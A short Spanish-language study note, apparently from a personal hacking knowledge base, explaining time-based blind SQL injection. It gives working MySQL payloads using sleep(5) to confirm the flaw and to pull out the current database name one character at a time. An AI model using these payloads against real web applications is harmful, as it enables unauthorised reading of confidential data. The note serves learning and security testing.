# Time-based Blind SQL injection

***

* Tags: #OWASP\_TOP\_10 #vulnerabilidad #hacking #sql #exploiting

***

## Definición

> La **Inyección SQL basada en tiempo (Time-based SQL Injection)** es un tipo de \[\[SQL Injection]] en aplicaciones web donde los atacantes introducen código malicioso para retrasar respuestas y deducir información de la base de datos. Aprovechan pausas en las respuestas para inferir si las consultas son verdaderas o falsas, permitiéndoles extraer datos confidenciales.

Para proceder con este tipo de inyección, procederemos de una forma bastante similar que con \[\[Boolean-based Blind SQL Injection]], solo que ahora en vez de comprobar con el estado de la respuesta, lo hacemos con pausas en la web, por ejemplo podemos insertar la siguiente query para comprobar si realmente espera lo solicitado, y si es así, sabremos que es vulnerable:

```
?id=1 and sleep(5)
```

Para conseguir información relevante, podemos realizar la siguiente sentencia para conseguir el nombre de la **base de datos actual**, e ir probando con los distintos valores hasta que se realice la espera solicitada:

```
#Probando primer carácter
id = 1 and if(ascii(substr(database(),1,1))=97,sleep(5),1); #No espera 5 segs
id = 1 and if(ascii(substr(database(),1,1))=98,sleep(5),1); #No espera 5 segs
id = 1 and if(ascii(substr(database(),1,1))=99,sleep(5),1); #Espera 5 segs => El primer carácter es una c

#Probando segundo carácter
id = 1 and if(ascii(substr(database(),2,1))=97,sleep(5),1); #No espera 5 segs
id = 1 and if(ascii(substr(database(),2,1))=98,sleep(5),1); #No espera 5 segs
.....
```

Utilizamos dicho principio para programar el script \[\[sqli.py]].
